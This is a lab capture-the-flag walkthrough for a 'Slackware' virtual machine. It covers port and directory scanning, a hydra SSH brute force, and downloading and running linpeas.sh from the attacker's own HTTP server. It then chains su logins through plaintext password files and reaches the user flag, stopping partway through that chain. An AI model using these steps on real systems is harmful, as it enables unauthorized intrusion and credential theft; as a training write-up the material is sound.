@@ -1,0 +1,1008 @@
+			ENUMERATION
+
+			
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 86540  bytes 20025866 (19.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 83525  bytes 6709612 (6.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 48  bytes 3176 (3.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 48  bytes 3176 (3.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+---netdiscover---
+
+                                                                                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                      
+                                                                                                      
+ 12 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 720                                     
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      3     180  Unknown vendor                                     
+ 10.0.2.2        52:54:00:12:35:00      3     180  Unknown vendor                                     
+ 10.0.2.3        08:00:27:c6:c9:cf      3     180  PCS Systemtechnik GmbH                             
+ 10.0.2.48       08:00:27:4a:a9:df      3     180  PCS Systemtechnik GmbH                             
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                              
+
+
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.48 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 17:49 +03
+Nmap scan report for 10.0.2.48
+Host is up (0.00074s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT  STATE SERVICE VERSION
+1/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)
+|_  256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)
+2/tcp open  http    Apache httpd 2.4.58 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.58 (Unix)
+|_http-title: Tribute to Slackware
+MAC Address: 08:00:27:4A:A9:DF (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.74 ms 10.0.2.48
+
+
+
+
+---we see the open ports are---
+1/tcp ssh 
+2/tcp http
+
+
+---when I visit the website we see that it talks about slackware, a Linux distribution created by Patrick 
+Volkerding in 1993---
+
+
+
+---Let's run a dirb scan---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.48:2
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat May  4 18:31:18 2024
+URL_BASE: http://10.0.2.48:2/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.48:2/ ----
++ http://10.0.2.48:2/index.html (CODE:200|SIZE:7511)                                                    
++ http://10.0.2.48:2/robots.txt (CODE:200|SIZE:21)                                                      
+                                                                                                        
+-----------------
+END_TIME: Sat May  4 18:31:24 2024
+DOWNLOADED: 4612 - FOUND: 2
+                           
+
+
+---we check the robots.txt---
+
+User-agent: *
+#7z.001
+
+
+
+---this might come in handy---
+
+
+
+---let's do some more enum with gobuster---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.48:2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.48:2
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/getslack             (Status: 301) [Size: 236] [--> http://10.0.2.48:2/getslack/]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+                         
+
+
+---here we see one more hidden page /getslack, when we go to http://10.0.2.48:2/getslack we see a message that
+says search here. Let's fuzz this also---
+
+
+---I kept on fuzzing in different ways but it's no use, let's try something else. The info we got from the 
+robots.txt file, let's use it in the url and fuzz it---
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u "http://10.0.2.48:2/getslack/FUZZ.7z.001" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fs 12
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.48:2/getslack/FUZZ.7z.001
+ :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 12
+________________________________________________
+
+twitter                 [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 5ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 6666 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
+                       
+
+
+---we see a new subdomain named twitter. In the robots.txt it said #7z.001 so lets add that domain in front---
+
+
+
+---Go to the adress 10.0.2.48:2/getslack/twitter.7z.001 and a file is downloaded---
+
+
+
+---Okay now let's run yet another scan to discover if there are any files such as in the twitter.7z.001---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u "http://10.0.2.48:2/getslack/twitter.7z.FUZZ" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fs 12
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.48:2/getslack/twitter.7z.FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 12
+________________________________________________
+
+001                     [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 2ms]
+002                     [Status: 200, Size: 20480, Words: 79, Lines: 69, Duration: 5ms]
+007                     [Status: 200, Size: 20480, Words: 93, Lines: 70, Duration: 2ms]
+005                     [Status: 200, Size: 20480, Words: 85, Lines: 69, Duration: 6ms]
+004                     [Status: 200, Size: 20480, Words: 93, Lines: 77, Duration: 3ms]
+003                     [Status: 200, Size: 20480, Words: 78, Lines: 92, Duration: 4ms]
+006                     [Status: 200, Size: 20480, Words: 74, Lines: 68, Duration: 3ms]
+010                     [Status: 200, Size: 20480, Words: 90, Lines: 77, Duration: 15ms]
+009                     [Status: 200, Size: 20480, Words: 84, Lines: 66, Duration: 4ms]
+012                     [Status: 200, Size: 20480, Words: 81, Lines: 67, Duration: 9ms]
+013                     [Status: 200, Size: 20480, Words: 96, Lines: 58, Duration: 2ms]
+014                     [Status: 200, Size: 1860, Words: 9, Lines: 9, Duration: 1ms]
+008                     [Status: 200, Size: 20480, Words: 78, Lines: 84, Duration: 9ms]
+011                     [Status: 200, Size: 20480, Words: 83, Lines: 63, Duration: 7ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 4081 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
+                          
+
+
+---we see files from 1 to 14, let's download all of them into our folder--- 
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# wget http://10.0.2.48:2/getslack/twitter.7z.003
+--2024-05-04 18:57:00--  http://10.0.2.48:2/getslack/twitter.7z.003
+Connecting to 10.0.2.48:2... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 20480 (20K) [application/x-7z-compressed]
+Saving to: ‘twitter.7z.003’
+
+twitter.7z.003             100%[=====================================>]  20.00K  --.-KB/s    in 0.001s  
+
+2024-05-04 18:57:00 (29.0 MB/s) - ‘twitter.7z.003’ saved [20480/20480]
+
+
+
+.
+.
+.
+.
+.
+.
+                                             
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# wget http://10.0.2.48:2/getslack/twitter.7z.014
+--2024-05-04 19:02:21--  http://10.0.2.48:2/getslack/twitter.7z.014
+Connecting to 10.0.2.48:2... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1860 (1.8K) [application/x-7z-compressed]
+Saving to: ‘twitter.7z.014’
+
+twitter.7z.014             100%[=====================================>]   1.82K  --.-KB/s    in 0s      
+
+2024-05-04 19:02:21 (420 MB/s) - ‘twitter.7z.014’ saved [1860/1860]
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# ls -la
+total 284
+drwxr-xr-x  2 okina okina  4096 May  4 19:09 .
+drwxrwxrwx 27 okina okina  4096 May  4 18:11 ..
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.001
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.002
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.003
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.004
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.005
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.006
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.007
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.008
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.009
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.010
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.011
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.012
+-rw-r--r--  1 root  root  20480 Mar 11 00:02 twitter.7z.013
+-rw-r--r--  1 root  root   1860 Mar 11 00:02 twitter.7z.014
+                                                    
+
+
+
+---only the twitter.7z.001 appears to be a zip file, lets unzip it using the command 7z---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# 7z x twitter.7z.001                                   
+
+7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit locale=C.UTF-8 Threads:2 OPEN_MAX:1024
+
+Scanning the drive for archives:
+1 file, 20480 bytes (20 KiB)
+
+Extracting archive: twitter.7z.001
+--         
+Path = twitter.7z.001
+Type = Split
+Physical Size = 20480
+Volumes = 14
+Total Physical Size = 268100
+----
+Path = twitter.7z
+Size = 268100
+--
+Path = twitter.7z
+Type = 7z
+Physical Size = 268100
+Headers Size = 130
+Method = LZMA2:384k
+Solid = -
+Blocks = 1
+
+Everything is Ok
+
+Size:       267951
+Compressed: 268100
+
+
+
+
+---we got a file named twitter.png, check it---
+
+
+---It's the photo of a man, if you wish you can search for it, but I have an idea who he is :)---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# strings twitter.png
+.
+.
+.
+.
+.
+.
+.
+trYth1sPasS1993
+
+
+
+
+---we got a potential password, but we don't know any username---
+
+
+---in the webpage about slackware, the founder's name can be found, Patrick Volkerding. I am going to 
+go give his name a shot---
+
+
+
+
+NOTE---
+
+If you didn't want to just guess and create a wordlist of possible usernames/passwords for Patrick
+Volkerding, you could use the cupp tool that we have discovered recently and then use hydra to find the true
+credentials
+
+┌──(root㉿kali)-[/home/okina]
+└─# hydra -L /opt/cupp/patrick.txt -p "trYth1sPasS1993" ssh://10.0.2.48:1 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+
+[1][ssh] host: 10.0.2.48   login: patrick   password: trYth1sPasS1993
+1 of 1 target successfully completed, 1 valid password found
+
+END OF NOTE------
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/opt/cupp]
+└─# ssh patrick@10.0.2.48 -p 1
+The authenticity of host '[10.0.2.48]:1 ([10.0.2.48]:1)' can't be established.
+ED25519 key fingerprint is SHA256:m/iaIzavXraumIPoCQReEwCgahrbGQe8WpPXO8nfAqE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.0.2.48]:1' (ED25519) to the list of known hosts.
+(patrick@10.0.2.48) Password: 
+Linux 5.15.145.
+patrick@slackware:~$ pwd
+/home/patrick
+
+
+
+---heh, that worked and we are in. Let's look around---
+			
+
+
+---Not much have came from manuel enumeration, lets use linpeas.sh---
+	
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 5050
+Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
+10.0.2.48 - - [04/May/2024 19:28:39] "GET /linpeas.sh HTTP/1.1" 200 -
+
+	
+patrick@slackware:~/.cache/keyring-UJZ0M2$ cd /tmp
+
+patrick@slackware:/tmp$ wget http://10.0.2.15:5050/linpeas.sh
+--2024-05-04 16:45:35--  http://10.0.2.15:5050/linpeas.sh
+Connecting to 10.0.2.15:5050... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 860549 (840K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                 100%[=====================================>] 840.38K  --.-KB/s    in 0.03s   
+
+2024-05-04 16:45:35 (26.5 MB/s) - ‘linpeas.sh’ saved [860549/860549]
+
+patrick@slackware:/tmp$ ls
+linpeas.sh  mc-root/
+
+
+patrick@slackware:/tmp$ bash linpeas.sh
+
+
+
+
+---we see some interesting info in the results---
+
+
+
+
+╔══════════╣ Files inside /home/patrick (limit 20)
+total 5
+drwx--x--x  4 patrick users    128 May  4 16:46 .
+drwxr-xr-x 54 root    root    1400 Mar 10 22:16 ..
+drwx------  2 patrick patrick   48 May  4 16:45 .cache
+drwx------  3 patrick patrick  176 May  4 16:46 .gnupg
+-rw-r--r--  1 patrick users   3729 Feb  2  2022 .screenrc
+
+╔══════════╣ Files inside others home (limit 20)
+/home/claor/mypass.txt
+/home/claor/.screenrc
+/home/kretinga/mypass.txt
+/home/kretinga/.screenrc
+/var/www/error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
+
+
+---let's check the files of the claor---
+
+
+
+patrick@slackware:/tmp$ cd /home/claor
+
+patrick@slackware:/home/claor$ ls -la
+total 9
+drwxr-x---  2 claor kretinga  112 Mar 10 22:15 ./
+drwxr-xr-x 54 root  root     1400 Mar 10 22:16 ../
+-rw-r--r--  1 claor claor    3729 Feb  2  2022 .screenrc
+-rw-r-----  1 claor kretinga   13 Mar 10 22:15 mypass.txt
+
+patrick@slackware:/home/claor$ cat mypass.txt 
+JRksNe5rWgis
+
+
+
+---we found claor's password, lets do the same for kretinga too---
+
+
+			
+patrick@slackware:/home/claor$ cd /home/kretinga
+patrick@slackware:/home/kretinga$ ls
+mypass.txt
+patrick@slackware:/home/kretinga$ cat mypass.txt 
+lpV8UG0GxKuw
+
+
+
+---okay, we have lot's of users here and we try to navigate and check any of them has higher privileges, 
+has user flags or something that can be useful for us. To do so
+we can use id command to see the users that they are in the same group with, to find if they share files
+with each other like kretinga and claor does with patrick. This is going to be a long chain of users---
+
+
+---basically we will check every user's own directory to see if one of them has the user flag or some other
+credential---
+
+
+
+kretinga@slackware:~$ id
+uid=1001(kretinga) gid=1001(kretinga) groups=1001(kretinga),1002(claor)
+
+kretinga@slackware:~$ su patrick
+Password: 
+patrick@slackware:/home/kretinga$ id
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
+
+patrick@slackware:/home/kretinga$ su claor
+Password: 
+claor@slackware:/home/kretinga$ id
+uid=1002(claor) gid=1002(claor) groups=1002(claor),1003(alienum)
+
+
+
+---here we see alienum, a different user is in the same group as claor, let's check his file--- 
+
+
+
+claor@slackware:/home/kretinga$ cd /home/alienum
+claor@slackware:/home/alienum$ ls
+mypass.txt
+claor@slackware:/home/alienum$ cat mypass.txt 
+ex0XVRAAjCWX
+
+
+su alienum
+Password: 
+
+alienum@slackware:~$ id
+uid=1003(alienum) gid=1003(alienum) groups=1003(alienum),1004(mrmidnight)
+alienum@slackware:~$ cd /home/mrmidnight/
+alienum@slackware:/home/mrmidnight$ cat mypass.txt 
+B4ReHPEhmlPt
+
+alienum@slackware:/home/mrmidnight$ su mrmidnight
+Password: 
+
+mrmidnight@slackware:~$ id
+uid=1004(mrmidnight) gid=1004(mrmidnight) groups=1004(mrmidnight),1005(annlynn)
+mrmidnight@slackware:~$ cd /home/annlynn/
+mrmidnight@slackware:/home/annlynn$ cat mypass.txt 
+S64IamSERUI3
+
+mrmidnight@slackware:/home/annlynn$ su annlynn
+Password: 
+
+annlynn@slackware:~$ id
+uid=1005(annlynn) gid=1005(annlynn) groups=1005(annlynn),1006(powerful)
+annlynn@slackware:~$ cd /home/powerful/
+annlynn@slackware:/home/powerful$ cat mypass.txt 
+pof2XIpVzYl3
+
+annlynn@slackware:/home/powerful$ su powerful
+Password: 
+
+powerful@slackware:~$ id
+uid=1006(powerful) gid=1006(powerful) groups=1006(powerful),1007(proxy)
+powerful@slackware:~$ cd /home/proxy
+powerful@slackware:/home/proxy$ cat mypass.txt 
+GX2xnNNU2Hcc
+
+powerful@slackware:/home/proxy$ su proxy
+Password: 
+
+proxy@slackware:~$ id
+uid=1007(proxy) gid=1007(proxy) groups=1007(proxy),1008(x4v1l0k)
+proxy@slackware:~$ cd /home/x4v1l0k/
+proxy@slackware:/home/x4v1l0k$ cat mypass.txt 
+TB7pVPwPUeIW
+
+proxy@slackware:/home/x4v1l0k$ su x4v1l0k
+Password: 
+
+x4v1l0k@slackware:~$ id
+uid=1008(x4v1l0k) gid=1008(x4v1l0k) groups=1008(x4v1l0k),1009(icex64)
+x4v1l0k@slackware:~$ cat /home/icex64/mypass.txt
+tX5o7AUg2PTd
+
+x4v1l0k@slackware:~$ su icex64
+Password: 
+
+icex64@slackware:/home/x4v1l0k$ id
+uid=1009(icex64) gid=1009(icex64) groups=1009(icex64),1010(mindsflee)
+icex64@slackware:/home/x4v1l0k$ cat /home/mindsflee/mypass.txt
+VZFoxk0lqnnc
+
+icex64@slackware:/home/x4v1l0k$ su mindsflee
+Password: 
+
+mindsflee@slackware:/home/x4v1l0k$ id
+uid=1010(mindsflee) gid=1010(mindsflee) groups=1010(mindsflee),1011(zacarx007)
+mindsflee@slackware:/home$ cat /home/zacarx007/mypass.txt
+8LCa5IDAELR4
+
+mindsflee@slackware:/home$ su zacarx007
+Password: 
+
+zacarx007@slackware:/home$ id
+uid=1011(zacarx007) gid=1011(zacarx007) groups=1011(zacarx007),1012(terminal)
+zacarx007@slackware:/home$ cat /home/terminal/mypass.txt
+Qv0dtvZdfpvN
+
+zacarx007@slackware:/home$ su terminal
+Password: 
+
+terminal@slackware:/home$ id
+uid=1012(terminal) gid=1012(terminal) groups=1012(terminal),1013(zenmpi)
+terminal@slackware:/home$ cat /home/zenmpi/mypass.txt
+WiEbQP6K4Sg9
+
+terminal@slackware:/home$ su zenmpi
+Password: 
+
+zenmpi@slackware:/home$ id
+uid=1013(zenmpi) gid=1013(zenmpi) groups=1013(zenmpi),1014(sml)
+zenmpi@slackware:/home$ cat /home/sml/mypass.txt
+AQewY20VryO7
+
+zenmpi@slackware:/home$ su sml
+Password: 
+
+sml@slackware:/home$ id
+uid=1014(sml) gid=1014(sml) groups=1014(sml),1015(emvee)
+sml@slackware:/home$ cat /home/emvee/mypass.txt
+sj5mu74Nmowb
+
+sml@slackware:/home$ su emvee
+Password: 
+
+emvee@slackware:/home$ id
+uid=1015(emvee) gid=1015(emvee) groups=1015(emvee),1016(nls)
+emvee@slackware:/home$ cat /home/nls/mypass.txt
+VfS9EIU5C9xw
+
+emvee@slackware:/home$ su nls
+Password: 
+
+nls@slackware:/home$ id
+uid=1016(nls) gid=1016(nls) groups=1016(nls),1017(noname)
+nls@slackware:/home$ cat /home/noname/mypass.txt
+0Vsok2PoVo7t
+
+nls@slackware:/home$ su noname
+Password: 
+
+noname@slackware:/home$ id
+uid=1017(noname) gid=1017(noname) groups=1017(noname),1018(nolose)
+noname@slackware:/home$ cat /home/nolose/mypass.txt
+KcHXtRsiUPpw
+
+noname@slackware:/home$ su nolose
+Password: 
+
+nolose@slackware:/home$ id
+uid=1018(nolose) gid=1018(nolose) groups=1018(nolose),1019(sancelisso)
+nolose@slackware:/home$ cat /home/sancelisso/mypass.txt
+oAGSK1zXcbT8
+
+nolose@slackware:/home$ su sancelisso
+Password: 
+
+sancelisso@slackware:/home$ id
+uid=1019(sancelisso) gid=1019(sancelisso) groups=1019(sancelisso),1020(ruycr4ft)
+sancelisso@slackware:/home$ cat /home/ruycr4ft/mypass.txt
+G5UJEpW78pOV
+
+sancelisso@slackware:/home$ su ruycr4ft
+Password: 
+
+ruycr4ft@slackware:/home$ id
+uid=1020(ruycr4ft) gid=1020(ruycr4ft) groups=1020(ruycr4ft),1021(tasiyanci)
+ruycr4ft@slackware:/home$ cat /home/tasiyanci/mypass.txt
+JO8dvF60MdXR
+
+ruycr4ft@slackware:/home$ su tasiyanci
+Password: 
+
+tasiyanci@slackware:/home$ id
+uid=1021(tasiyanci) gid=1021(tasiyanci) groups=1021(tasiyanci),1022(lanz)
+tasiyanci@slackware:/home$ cat /home/lanz/mypass.txt
+IBrVGveXM3jI
+
+tasiyanci@slackware:/home$ su lanz
+Password: 
+
+lanz@slackware:/home$ id
+uid=1022(lanz) gid=1022(lanz) groups=1022(lanz),1023(pylon)
+lanz@slackware:/home$ cat /home/pylon/mypass.txt
+6Mqoo8Pud4Fx
+
+lanz@slackware:/home$ su pylon
+Password: 
+
+pylon@slackware:/home$ id
+uid=1023(pylon) gid=1023(pylon) groups=1023(pylon),1024(wwfymn)
+pylon@slackware:/home$ cat /home/wwfymn/mypass.txt
+VBebiyG62uIg
+
+pylon@slackware:/home$ su wwfymn
+Password: 
+
+wwfymn@slackware:/home$ id
+uid=1024(wwfymn) gid=1024(wwfymn) groups=1024(wwfymn),1025(whitecr0wz)
+wwfymn@slackware:/home$ cat /home/whitecr0wz/mypass.txt
+51BwJ9iYO4E7
+
+wwfymn@slackware:/home$ su whitecr0wz
+Password: 
+
+whitecr0wz@slackware:/home$ id
+uid=1025(whitecr0wz) gid=1025(whitecr0wz) groups=1025(whitecr0wz),1026(bit)
+whitecr0wz@slackware:/home$ cat /home/bit/mypass.txt
+fDZRz4SJOs8z
+
+whitecr0wz@slackware:/home$ su bit
+Password: 
+
+bit@slackware:/home$ id
+uid=1026(bit) gid=1026(bit) groups=1026(bit),1027(infayerts)
+bit@slackware:/home$ cat /home/infayerts/mypass.txt
+NYURcD5V8k4X
+
+bit@slackware:/home$ su infayerts
+Password: 
+
+infayerts@slackware:/home$ id
+uid=1027(infayerts) gid=1027(infayerts) groups=1027(infayerts),1028(rijaba1)
+infayerts@slackware:/home$ cat /home/rijaba1/mypass.txt
+eaqz8vJ2pRmU
+
+infayerts@slackware:/home$ su rijaba1
+Password: 
+
+rijaba1@slackware:/home$ id
+uid=1028(rijaba1) gid=1028(rijaba1) groups=1028(rijaba1),1029(cromiphi)
+rijaba1@slackware:/home$ cat /home/cromiphi/mypass.txt
+CQBpV2NQ3U6A
+
+rijaba1@slackware:/home$ su cromiphi
+Password: 
+
+cromiphi@slackware:/home$ id
+uid=1029(cromiphi) gid=1029(cromiphi) groups=1029(cromiphi),1030(gatogamer)
+cromiphi@slackware:/home$ cat /home/gatogamer/mypass.txt
+yjwGMry82S2Y
+
+cromiphi@slackware:/home$ su gatogamer
+Password: 
+
+gatogamer@slackware:/home$ id
+uid=1030(gatogamer) gid=1030(gatogamer) groups=1030(gatogamer),1031(ch4rm)
+gatogamer@slackware:/home$ cat /home/ch4rm/mypass.txt
+Hz35MslshyXj
+
+gatogamer@slackware:/home$ su ch4rm
+Password: 
+
+ch4rm@slackware:~$ id
+uid=1031(ch4rm) gid=1031(ch4rm) groups=1031(ch4rm),1032(aceomn)
+ch4rm@slackware:~$ cat /home/aceomn/mypass.txt
+sXdnu8wF1Yb8
+
+ch4rm@slackware:~$ su aceomn
+Password: 
+
+aceomn@slackware:/home/ch4rm$ id
+uid=1032(aceomn) gid=1032(aceomn) groups=1032(aceomn),1033(kerszi)
+aceomn@slackware:/home/ch4rm$ cat /home/kerszi/mypass.txt
+rjDwcHDFYBML
+
+aceomn@slackware:/home/ch4rm$ su kerszi
+Password: 
+
+kerszi@slackware:/home/ch4rm$ id
+uid=1033(kerszi) gid=1033(kerszi) groups=1033(kerszi),1034(d3b0o)
+kerszi@slackware:/home/ch4rm$ cat /home/d3b0o/mypass.txt
+oHjylQ7402Dd
+
+kerszi@slackware:/home/ch4rm$ su d3b0o
+Password: 
+
+d3b0o@slackware:/home$ id
+uid=1034(d3b0o) gid=1034(d3b0o) groups=1034(d3b0o),1035(avijneyam)
+d3b0o@slackware:/home$ cat avijneyam/mypass.txt
+vRdS8PLTnTlW
+
+d3b0o@slackware:/home$ su avijneyam
+Password: 
+
+avijneyam@slackware:/home$ id
+uid=1035(avijneyam) gid=1035(avijneyam) groups=1035(avijneyam),1036(zayotic)
+avijneyam@slackware:/home$ cat zayotic/mypass.txt
+bgg9TT9otdD6
+
+avijneyam@slackware:/home$ su zayotic
+Password: 
+
+zayotic@slackware:/home$ id
+uid=1036(zayotic) gid=1036(zayotic) groups=1036(zayotic),1037(kaian)
+zayotic@slackware:/home$ cat kaian/mypass.txt
+R23AJFVTQYaB
+
+zayotic@slackware:/home$ su kaian
+Password: 
+
+kaian@slackware:/home$ id
+uid=1037(kaian) gid=1037(kaian) groups=1037(kaian),1038(c4rta)
+kaian@slackware:/home$ cat c4rta/mypass.txt
+IAuaOSSTZHoh
+
+kaian@slackware:/home$ su c4rta
+Password: 
+
+c4rta@slackware:/home$ id
+uid=1038(c4rta) gid=1038(c4rta) groups=1038(c4rta),1039(boyras200)
+c4rta@slackware:/home$ cat boyras200/mypass.txt
+oW19TzLywNIq
+
+c4rta@slackware:/home$ su boyras200
+Password: 
+
+
+boyras200@slackware:/home$ id
+uid=1039(boyras200) gid=1039(boyras200) groups=1039(boyras200),1040(waidroc)
+boyras200@slackware:/home$ cat waidroc/mypass.txt
+0aApTUf5E2Eq
+
+boyras200@slackware:/home$ su waidroc
+Password: 
+
+waidroc@slackware:/home$ id
+uid=1040(waidroc) gid=1040(waidroc) groups=1040(waidroc),1041(ziyos)
+waidroc@slackware:/home$ cat ziyos/mypass.txt
+8eS8I1JGxeeZ
+
+waidroc@slackware:/home$ su ziyos
+Password: 
+
+ziyos@slackware:/home$ id
+uid=1041(ziyos) gid=1041(ziyos) groups=1041(ziyos),1042(b4el7d)
+ziyos@slackware:/home$ cat b4el7d/mypass.txt
+llMttpVCiYPw
+
+ziyos@slackware:/home$ su b4el7d
+Password: 
+
+b4el7d@slackware:/home$ id
+uid=1042(b4el7d) gid=1042(b4el7d) groups=1042(b4el7d),1043(rpj7)
+b4el7d@slackware:/home$ cat rpj7/mypass.txt
+wP26CtkDby6J
+
+b4el7d@slackware:/home$ su rpj7
+Password: 
+
+rpj7@slackware:/home$ cd rpj7
+rpj7@slackware:~$ ls
+mypass.txt  user.txt
+rpj7@slackware:~$ cat user.txt
+    	      		
+---First User Flag---
+
+
+
+---I checked every user's own directory to discover something else than mypass.txt. User rpj7 has the user flag
+it seems---
+
+
+
+
+---now let's keep on checking for another clue in order to priv escalate---
+
+
+
+rpj7@slackware:~$ id
+uid=1043(rpj7) gid=1043(rpj7) groups=1043(rpj7),1044(h1dr0)
+rpj7@slackware:~$ cat /home/h1dr0/mypass.txt
+tnvAny2zwYTV
+
+rpj7@slackware:~$ su h1dr0
+Password: 
+
+
+h1dr0@slackware:/home$ id
+uid=1044(h1dr0) gid=1044(h1dr0) groups=1044(h1dr0),1045(catch_me75)
